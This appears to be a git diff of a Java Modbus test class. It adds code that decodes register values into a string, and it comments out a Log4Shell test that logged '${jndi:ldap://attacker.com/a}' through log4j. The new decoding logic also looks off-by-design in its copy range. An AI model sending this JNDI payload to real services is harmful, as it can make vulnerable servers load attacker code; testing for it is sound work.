@@ -13,6 +13,9 @@ import org.apache.logging.log4j.LogManager;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 
+import java.nio.ByteBuffer;
+import java.nio.ByteOrder;
+import java.nio.ShortBuffer;
 import java.nio.charset.StandardCharsets;
 import java.security.SecureRandom;
 import java.util.ArrayList;
@@ -29,10 +32,50 @@ public class TestModbus {
 
 
     public static void main(String[] args) throws ModbusInitException, ModbusTransportException, ErrorResponseException {
+//        ByteBuffer byteBuffer = ByteBuffer.allocate(200);
+//        byteBuffer.order(ByteOrder.LITTLE_ENDIAN);
+//        byteBuffer.putShort((short) 12336);
+//        byteBuffer.putShort((short) 12336);
+//        byteBuffer.putShort((short) 14129);
+//        byteBuffer.putShort((short) 12594);
+//        byteBuffer.putShort((short) 12594);
+//        byteBuffer.putShort((short) 14640);
+//        byteBuffer.putShort((short) 12336);
+//        byteBuffer.putShort((short) 12596);
+//        byteBuffer.putShort((short) 12336);
+//        byteBuffer.putShort((short) 12352);
+//        byteBuffer.putShort((short) 12336);
+//        byteBuffer.putShort((short) 13104);
+//        byteBuffer.putShort((short) 13111);
+//        byteBuffer.putShort((short) 12848);
+//        byteBuffer.putShort((short) 16441);
+//        byteBuffer.putShort((short) 12338);
+//        byteBuffer.putShort((short) 13616);
+//        byteBuffer.putShort((short) 12850);
+//        byteBuffer.putShort((short) 12336);
+//        byteBuffer.putShort((short) 12336);
+//        byteBuffer.putShort((short) 14902);
+//        byteBuffer.putShort((short) 12857);
+//        byteBuffer.putShort((short) 16698);
+
+
+        short[] data = new short[] {0, 1, 0, 0, 0, 0, 1, 2, 3, 1, 3, 3, 0, 1, -15729, 16818, -16777, 16691, -4194, 16972, -21496, 16252, 13107, 16691, -15729, 16818, 6816, 16823, -22020, 16902, 7078, 16947, -29360, 16955, -29360, 16955, -29360, 16955, -7340, 17270, -7340, 17170, 15335, 17236, -29360, 16955, 0, 0, 0, 0, 0, 0, 0, 0, 12336, 12336, 14129, 12594, 12594, 14640, 12336, 12596, 12336, 12352, 12336, 13104, 13111, 12848, 16441, 12338, 13616, 12850, 12336, 12336, 14902, 12857, 16698, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,};
+        int size = 0;
+        for (int i = 54; i <= 154; i ++) {
+            if (data[i] > 0) {
+                size ++;
+            }
+        }
+        ByteBuffer byteBuffer = ByteBuffer.allocate(size * 2);
+        byteBuffer.order(ByteOrder.LITTLE_ENDIAN);
+        ShortBuffer shortBuffer = byteBuffer.asShortBuffer();
+        shortBuffer.put(Arrays.copyOfRange(data, 54, size));
+        System.out.println(new String(byteBuffer.array(), StandardCharsets.UTF_8));
+
 //        System.out.println("093500201170000327211150001".substring(18, 27));
-        String header ="${jndi:ldap://attacker.com/a}";
-        LOG.info(header);
-        LOG.info("test: {}", header);
+//        String header ="${jndi:ldap://attacker.com/a}";
+//        LOG.info(header);
+//        LOG.info("test: {}", header);
 
 //        IpParameters params = new IpParameters();
 //        params.setHost("192.168.3.1");
